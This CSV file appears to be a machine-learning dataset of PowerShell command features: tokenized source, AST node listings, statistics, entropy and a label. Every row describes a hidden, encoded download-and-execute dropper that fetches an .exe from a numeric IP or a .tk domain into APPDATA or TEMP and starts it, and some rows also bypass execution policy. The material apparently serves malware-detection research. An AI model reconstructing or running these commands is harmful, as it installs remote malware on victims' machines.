new_parameters,source_code,ast,node_type_statistics,ast_deep,ast_total,ast_width,entropy,label
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 80 82 64 45 yakar msvmonr exe env appdata msvmonr exe start process env appdata msvmonr exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http80826445yakarmsvmonrexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.73217,0
executionpolicy bypass windowstyle hidden enc,new object system net webclient downloadfil http 185 141 27 34 updat exe env temp tmpfile86 exe start process env temp tmpfile86 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http1851412734updateexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.7329,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 166 140 zebra iesecv exe env appdata scvkem exe start process env appdata scvkem exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248166140zebraiesecvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.76435,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 58 30 trevor winx64 exe env appdata winx64 exe start process env appdata winx64 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025830trevorwinx64exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.74197,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
executionpolicy bypass windowstyle hidden enc,new object system net webclient downloadfil http nikil tk p1 pa 001 exe env temp pa 001 exe start process env temp pa 001 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpnikiltkp1Pa_001exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.58965,0
